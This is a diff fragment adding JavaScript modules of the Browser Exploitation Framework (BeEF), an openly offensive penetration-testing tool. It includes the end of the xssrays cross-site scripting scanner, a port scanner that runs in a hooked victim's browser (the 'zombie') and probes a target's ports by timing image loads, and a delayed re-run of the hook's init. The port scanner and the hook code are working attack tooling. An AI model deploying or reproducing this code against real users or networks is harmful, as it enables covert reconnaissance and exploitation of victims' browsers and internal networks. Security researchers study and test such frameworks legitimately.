+        this.totalConnections = this.stack.length;
+        that.getNextJob();
+        setInterval(function() {
+            var numOfConnections = 0;
+            for (var i = 0; i < document.getElementsByTagName('iframe').length; i++) {
+                var iframe = document.getElementsByTagName('iframe')[i];
+                numOfConnections++;
+                //beef.debug("runJobs parseInt(this.timestamp()) [" + parseInt(beef.net.xssrays.timestamp()) + "], parseInt(iframe.time) [" + parseInt(iframe.time) + "]");
+                if (parseInt(beef.net.xssrays.timestamp()) - parseInt(iframe.time) > 5) {
+                    try{
+                        if (iframe) {
+                            beef.net.xssrays.complete();
+                            beef.debug("RunJobs cleaning up iFrame [" + iframe.id + "]");
+                            document.body.removeChild(iframe);
+                        }
+                    }catch(e){
+			beef.debug("Exception [" + e.toString() + "] when cleaning iframes.")
+		    }
+                }
+            }
+
+            if (numOfConnections == 0) {
+                clearTimeout(this);
+            }
+
+        }, this.cleanUpTimeout);
+
+        return this;
+    },
+    timestamp: function() {
+        return parseInt(new Date().getTime().toString().substring(0, 10));
+    },
+    escape: function(str) {
+        str = str.toString();
+        str = str.replace(/</g, '&lt;');
+        str = str.replace(/>/g, '&gt;');
+        str = str.replace(/\u0022/g, '&quot;');
+        str = str.replace(/\u0027/g, '&#39;');
+        str = str.replace(/\\/g, '&#92;');
+        return str;
+    }
+
+};
+
+beef.regCmp('beef.net.xssrays');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Provides port scanning functions for the zombie. A mod of pdp's scanner
+ * 
+ * Version: '0.1',
+ * author: 'Petko Petkov',
+ * homepage: 'http://www.gnucitizen.org'
+ * @namespace beef.net.portscanner
+ */
+
+beef.net.portscanner = {
+
+		/**
+		 * 
+		 * @param callback 
+		 * @param target 
+		 * @param port 
+		 * @param timeout 
+		 */
+		scanPort: function(callback, target, port, timeout) 
+		{
+			var timeout = (timeout == null)?100:timeout;
+			var img = new Image();
+
+			img.onerror = function () {
+				if (!img) return;
+				img = undefined;
+				callback(target, port, 'open');
+			};
+
+			img.onload  = img.onerror;
+			
+			img.src = 'http://' + target + ':' + port;
+
+			setTimeout(function () {
+				if (!img) return;
+				img = undefined;
+				callback(target, port, 'closed');
+			}, timeout);
+
+		},
+		/**
+		 * 
+		 * @param callback 
+		 * @param target 
+		 * @param ports_str 
+		 * @param timeout 
+		 */
+		scanTarget: function(callback, target, ports_str, timeout)
+		{
+			var ports = ports_str.split(",");
+
+			for (index = 0; index < ports.length; index++) {
+				this.scanPort(callback, target, ports[index], timeout);
+			};
+
+		}
+};
+
+beef.regCmp('beef.net.portscanner');
+
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/** 
+ * A series of functions that handle statuses, returns a number based on the function called.
+ * @namespace beef.are
+ */
+
+beef.are = {
+  /**
+   * A function for handling a success status
+   * @memberof beef.are
+   * @method status_success 
+   * @return {number} 1
+   */
+  status_success: function(){
+    return 1;
+  },
+  /**
+   * A function for handling an unknown status
+   * @memberof beef.are
+   * @method status_unknown 
+   * @return {number} 0
+   */  
+  status_unknown: function(){
+    return 0;
+  },
+  /**
+   * A function for handling an error status
+   * @memberof beef.are
+   * @method status_error 
+   * @return {number} -1
+   */  
+  status_error: function(){
+    return -1;
+  }
+};
+beef.regCmp("beef.are");
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Sometimes there are timing issues and looks like beef_init
+ * is not called at all (always in cross-origin situations,
+ * for example calling the hook with jquery getScript,
+ * or sometimes with event handler injections).
+ * 
+ * To fix this, we call again beef_init after 1 second.
+ * Cheers to John Wilander that discussed this bug with me at OWASP AppSec Research Greece
+ * antisnatchor
+ * @namespace beef.timeout
+ */
+
+ /**
+  * @memberof beef.timeout 
+  * @function setTimeout 
+  */
+setTimeout(beef_init, 1000);
 
 
